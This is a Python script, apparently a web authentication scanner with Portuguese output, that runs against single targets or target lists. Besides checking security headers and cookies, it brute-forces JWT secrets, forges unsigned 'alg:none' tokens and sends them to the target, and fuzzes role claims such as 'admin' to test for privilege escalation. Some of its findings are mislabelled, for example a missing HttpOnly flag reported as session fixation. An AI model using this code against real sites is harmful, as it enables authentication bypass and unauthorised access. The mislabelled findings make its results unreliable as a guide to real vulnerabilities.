import requests
from urllib.parse import urlparse
from rich import print
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor
import urllib3
import json
import base64
import os
import re

os.system("clear")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

SECURITY_HEADERS = {
    "Strict-Transport-Security": "Protege contra downgrade para HTTP.",
    "Content-Security-Policy": "Previne ataques como XSS e injeção de conteúdo.",
    "X-Content-Type-Options": "Evita interpretação errada de tipos MIME.",
    "X-Frame-Options": "Previne clickjacking.",
    "X-XSS-Protection": "Ativa proteção contra XSS (obsoleta, mas pode aparecer).",
    "Referrer-Policy": "Controla o envio do header Referer.",
    "Permissions-Policy": "Restringe APIs perigosas no navegador.",
    "Access-Control-Allow-Origin": "Controla compartilhamento de recursos entre origens."
}

COOKIES_VULNERAVEIS = [
    "rememberMe", "JSESSIONID", "PHPSESSID", "sessionid", "auth_token"
]

SECRET_TESTS = ["admin", "1234", "senha", "jwt", "token", "test", "qwerty"]

resultados = []

def normalize_url(url):
    parsed = urlparse(url.strip())
    if not parsed.scheme:
        return "https://" + url
    return url

def detectar_jwt(valor):
    partes = valor.split(".")
    if len(partes) == 3:
        try:
            base64.urlsafe_b64decode(partes[0] + '==')
            base64.urlsafe_b64decode(partes[1] + '==')
            return True
        except Exception:
            return False
    return False

def decode_jwt(valor):
    partes = valor.split(".")
    try:
        header = json.loads(base64.urlsafe_b64decode(partes[0] + '==').decode('utf-8'))
        payload = json.loads(base64.urlsafe_b64decode(partes[1] + '==').decode('utf-8'))
        return header, payload
    except Exception:
        return {}, {}

def encode_jwt_alg_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    token = f"{header_b64}.{payload_b64}."
    return token

def verificar_jwt_inseguro(header):
    if not header:
        return "Header inválido"
    alg = header.get("alg")
    if not alg:
        return "Algoritmo ausente"
    elif alg.lower() == "none":
        return "Algoritmo 'none' detectado"
    return None

def brute_force_jwt_secret(token):
    import jwt
    for secret in SECRET_TESTS:
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            return secret
        except jwt.exceptions.InvalidSignatureError:
            continue
        except:
            break
    return None

def detectar_serializacao(cookie_val):
    if any(cookie_val.startswith(p) for p in ["O:", "a:", "s:", "b:", "N;", "rO0AB", "%", '{"']):
        return True
    return False

def detectar_path_traversal(valor):
    return any(p in valor.lower() for p in ["../", "%2e%2e", "..\\", "%252e%252e"])

def tentar_exploit_jwt_alg_none(url, nome_cookie, payload):
    token_exploit = encode_jwt_alg_none(payload)
    cookies = {nome_cookie: token_exploit}
    try:
        resposta = requests.get(url, cookies=cookies, verify=False, timeout=10)
        console.print(f"[bold blue][EXPLOIT alg:none][/]: Enviado JWT modificado → status: {resposta.status_code}")
        return {
            "token_exploit": token_exploit,
            "status_code": resposta.status_code
        }
    except Exception as e:
        return {"erro": str(e)}

def fuzz_roles_e_privileges(url, nome_cookie, jwt_payload):
    roles = ["admin", "user", "moderator", "guest"]
    for role in roles:
        jwt_payload["role"] = role
        token = encode_jwt_alg_none(jwt_payload)
        cookies = {nome_cookie: token}
        try:
            resposta = requests.get(url, cookies=cookies, verify=False, timeout=10)
            if resposta.status_code == 200:
                console.print(f"[green][+] Role {role} autorizado! Status: {resposta.status_code} [/]") 
        except Exception as e:
            console.print(f"[bold red]Erro ao testar role {role}: {e}")

def check_headers(target):
    resultado = {
        "url": target,
        "headers": {},
        "cookies": {
            "possivelmente_serializados": [],
            "possiveis_jwt": [],
            "cookies_vulneraveis": [],
            "path_traversal": [],
            "session_fixation": [],
            "exploitados": [],
            "roles_testados": []
        }
    }

    try:
        url = normalize_url(target)
        console.print(f"\n[bold cyan]Analisando:[/] {url}")
        response = requests.get(url, timeout=10, verify=False)
        headers = response.headers

        for header, desc in SECURITY_HEADERS.items():
            if header in headers:
                console.print(f"[green][+] {header}[/]: OK")
                resultado["headers"][header] = True
            else:
                console.print(f"[red][-] {header}[/]: [italic]Faltando! {desc}[/]")
                resultado["headers"][header] = False

        cookies = response.cookies
        if cookies:
            console.print(f"[bold magenta][*] Cookies encontrados:[/]")
            for nome, valor in cookies.items():
                cookie_info = {"nome": nome, "valor": valor}

                if detectar_jwt(valor):
                    console.print(f"[yellow][JWT Detectado][/]: {nome} = {valor}")
                    header, payload = decode_jwt(valor)
                    inseguro = verificar_jwt_inseguro(header)
                    segredo = brute_force_jwt_secret(valor)
                    jwt_info = {
                        "nome": nome,
                        "valor": valor,
                        "header": header,
                        "payload": payload,
                        "problemas": []
                    }
                    if inseguro:
                        jwt_info["problemas"].append(inseguro)
                        exploit_result = tentar_exploit_jwt_alg_none(url, nome, payload)
                        jwt_info["exploit"] = exploit_result
                        resultado["cookies"]["exploitados"].append({
                            "cookie": nome,
                            "exploit": exploit_result
                        })
                    if segredo:
                        jwt_info["problemas"].append(f"Segredo fraco: {segredo}")
                    resultado["cookies"]["possiveis_jwt"].append(jwt_info)
                    fuzz_roles_e_privileges(url, nome, payload)

                elif detectar_serializacao(valor):
                    console.print(f"[bold red][Serialização suspeita][/]: {nome} = {valor}")
                    resultado["cookies"]["possivelmente_serializados"].append(cookie_info)

                if nome in COOKIES_VULNERAVEIS:
                    console.print(f"[bold red][Cookie vulnerável por nome][/]: {nome}")
                    resultado["cookies"]["cookies_vulneraveis"].append(nome)

                if detectar_path_traversal(valor):
                    console.print(f"[bold red][Path traversal detectado][/]: {nome} = {valor}")
                    resultado["cookies"]["path_traversal"].append(cookie_info)

                set_cookie_header = headers.get("Set-Cookie", "")
                if nome in set_cookie_header and "HttpOnly" not in set_cookie_header:
                    resultado["cookies"]["session_fixation"].append(nome)
                    console.print(f"[bold red][Possível Session Fixation][/]: {nome} sem HttpOnly")

        else:
            console.print("[magenta]- Nenhum cookie encontrado")

    except requests.exceptions.RequestException as e:
        console.print(f"[bold red][!] Erro ao conectar {target}:[/] {e}")
        resultado["erro"] = str(e)

    resultados.append(resultado)

def process_targets(file_path):
    try:
        with open(file_path, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(check_headers, targets)

    except FileNotFoundError:
        console.print(f"[bold red][!] Arquivo não encontrado:[/] {file_path}")

def salvar_json(nome_arquivo="resultados.json"):
    try:
        with open(nome_arquivo, "w") as f:
            json.dump(resultados, f, indent=4)
        console.print(f"\n[bold green][✓] Resultados salvos em:[/] {nome_arquivo}")
    except Exception as e:
        console.print(f"[bold red][!] Erro ao salvar JSON:[/] {e}")

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        console.print("[yellow]Uso:[/] python authscope.py alvo.com")
        console.print("[yellow]Ou:[/] python authscope.py targets.txt")
    else:
        arg = sys.argv[1]
        if arg.endswith(".txt"):
            process_targets(arg)
        else:
            check_headers(arg)

        salvar_json()
